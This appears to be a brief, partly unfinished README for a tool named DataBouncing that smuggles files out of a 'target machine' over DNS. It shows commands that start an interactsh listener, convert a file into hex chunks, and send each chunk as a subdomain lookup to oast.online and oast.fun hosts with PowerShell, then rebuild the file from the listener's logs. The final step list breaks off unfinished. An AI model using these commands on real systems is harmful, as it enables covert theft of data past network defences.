# DataBouncing

You have two options. 
Use the [InteractSh Web Client](https://app.interactsh.com/#/) or 
use this [Build Script](https://github.com/Unit-259/DataBouncing/blob/main/Resources/interactshBuild.sh) with an Ubuntu 22.04 image.

Run this command on your listener machine to start the InteractSh Client and define your log file

```
interactsh-client -v -o /root/DataBouncing/logs.txt
```

Next on the target machine you are going to want to convert a file to Hex and prepare it for transfer with this script:
[chunks](https://github.com/Unit-259/DataBouncing/blob/main/Client/Convert-FileToHexChunks.ps1)



```
foreach ($i in $x.PSObject.Properties) {echo $i.Value}
```


```
irm "xregex.$secret.cln0jgqilvdjjg1nk8d0ksttdzkd7waij.oast.online"
```

```
foreach ($i in $x.PSObject.Properties) {$secret = $i.Value;irm "xregex.$secret.cln6u1qilvdt6859fml0quuh98ohq8huk.oast.fun"}
```

```
Convert-hexToAscii (find-secret -FilePath ./logs.txt -XRegex 'xregex')
```

```
# 1. Convert File to hex 
# 2. segment with numbers 
# 3. 
```
